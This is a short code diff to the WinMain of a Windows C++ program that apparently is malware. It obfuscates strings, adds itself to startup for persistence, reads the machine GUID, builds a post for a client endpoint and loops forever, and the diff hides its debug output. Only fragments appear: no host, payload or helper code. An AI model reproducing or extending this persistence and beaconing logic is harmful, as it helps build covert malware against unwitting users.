@@ -59,8 +59,9 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			if (insatlled == OBFUSCATE("restart")) {
 				return 0;
 			}
-			std::thread startupPersistence(Helpers::addstartup);
-			startupPersistence.join();
+		    //std::thread startupPersistence(Helpers::addstartup);
+			//startupPersistence.join();
+			Helpers::addstartup();
 		}
 
 
@@ -75,7 +76,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost();
-		std::cout << finalPost;
+		//std::cout << finalPost;
 		//std::cout << "\n\n======";
 		while (true) {
 			try {
